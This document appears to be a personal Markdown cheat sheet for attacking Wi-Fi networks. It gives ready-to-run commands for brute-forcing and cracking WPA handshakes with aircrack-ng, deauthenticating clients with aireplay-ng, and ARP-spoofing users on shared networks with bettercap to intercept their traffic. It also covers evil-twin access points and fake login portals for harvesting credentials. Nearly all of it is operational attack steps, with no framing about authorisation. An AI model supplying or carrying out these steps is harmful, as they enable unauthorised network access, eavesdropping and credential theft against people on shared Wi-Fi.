# Wi-FI 


## Tools
- aircrack-ng suite
- bettercap
- Flipper 0
- WIFI Pineapple
- cewl
- pipal

# Bruteforce

- https://github.com/flancast90/wifi-bf

```bash
python3 __main__.py -f wordlist.txt -v 
```

![](../images/Pasted%20image%2020240712090835.png)
## Password cracking

- Turn wireless cards into monitor mode
```bash
sudo airmon-ng start wlan0
```
- Check process which can cause trouble
```bash
sudo airmon-ng check kill
```
- Start monitoring SSID from all bands (2.4GHz and 5GHz)
```bash
sudo airodump-ng wlan0 -abg
```
- Listen to the traffic to recover a four way handshake
```bash
sudo airodump-ng --bssid MAC_ADDRESS_OF_THE_ROUTER wlan0
```

- Crack the password with wordlist
**Note that custom wordlists can be generated**
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt hash.txt 
```


**Can also be done with a Flipper 0 and esp32 extension or a WIFI pineapple**
## De-authentication attack

```bash
sudo aireplay-ng -0 1 -a MAC_ADDRESS_OF_THE_ROUTER wlan0
```

## Man In The Middle
### Free WI-FI
**Requirements :**
 - Connection to the WI-FI network

- Launch the tool
```bash
# sudo bettercap -iface INTERFACE_NAME
sudo bettercap -iface eth0
```

- Activate net probing
```bettercap
net.probe on
```
- List connections
```bettercap
net.show
```
- Enable ARP spoofing
```bettercap
set arp.spoof.fulduplex true
set arp.spoof.targets IP_TO_SPOOF
```

**Open your best wireshark interface and be happy**

## Evil Twin
- By defaults, if two networks have the same SSID, devices will connect to the strongest and fastest

| Tool | Pros | Cons |
| ---- | ---- | ---- |
| Flipper 0 | I have one but it needs the esp32 extension | Can not connect to a real network so targets will quickly go back to another network |
| WI-FI Pineapple enterprise | Impersonate a network in one click. It also as a web interface. DNS spoofing. Impersonate every SSID it sees. |  |
##### Flipper 0
- `WiFI marauder module` 
- `Evil portal module`:  prompt a login page (google, facebook, ...)

# Resources
- https://github.com/thevickypedia/pywifi-controls